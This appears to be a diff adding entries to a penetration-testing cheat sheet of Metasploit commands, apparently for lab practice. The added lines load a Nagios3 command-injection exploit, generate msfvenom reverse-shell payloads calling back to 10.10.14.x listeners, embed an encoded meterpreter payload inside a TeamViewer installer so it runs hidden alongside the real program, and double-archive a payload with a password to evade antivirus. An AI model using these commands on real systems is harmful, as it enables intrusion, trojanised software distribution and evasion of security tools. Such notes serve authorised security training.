@@ -174,3 +174,36 @@ $ meterpreter > lsa_dump_secrets
 ```
 %% meterpreter commands to dumps secrets and hashes %%
 
+```
+$ searchsploit -t Nagios3 --exclude=".py"
+```
+%% using searchsploit to looking for an exploit and exclude .py as .rb (not all) are compatible with metasploit modules so better if you use them %%
+
+```
+$ cp ~/Downloads/9861.rb /usr/share/metasploit-framework/modules/exploits/unix/webapp/nagios3_command_injection.rb
+$ msf6 > reload_all
+$ msf6 > use exploit/unix/webapp/nagios3_command_injection
+```
+%% copying an exploit to the metasploit directory to use it with metasploit,  use snake-case, alphanumeric characters, and underscores instead of dashes.  You can then search for the module or go directly to that module with the path %%
+
+```
+$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx
+$ msf6 > use multi/handler
+```
+%% create a reverse shell  .aspx payload with msfvenom . Use it with multi/handler to generate a shell%%
+
+```
+$ msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5
+```
+%%   We can embed the shellcode into any installer, package, or program that we have at hand, hiding the payload shellcode deep within the legitimate code of the actual product.  To prevent suspicion and trigger normal continuation of norma execution of launched application we use the -k flag which pulls the payliad in a separate thread from the main application%%
+
+```
+$ msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -e x86/shikata_ga_nai -a x86 --platform windows -o ~/test.js -i 5
+$ wget https://www.rarlab.com/rar/rarlinux-x64-612.tar.gz
+$ tar -xzvf rarlinux-x64-612.tar.gz && cd rar
+$ rar a ~/test.rar -p ~/test.js
+$ mv test.rar test
+$ rar a test2.rar -p test
+$ mv test2.rar test2
+```
+%%  Archiving payload twice to bypass AV detection when transferring files onto our target machine, last command removes the.rar extension from our file making it ready for export %%
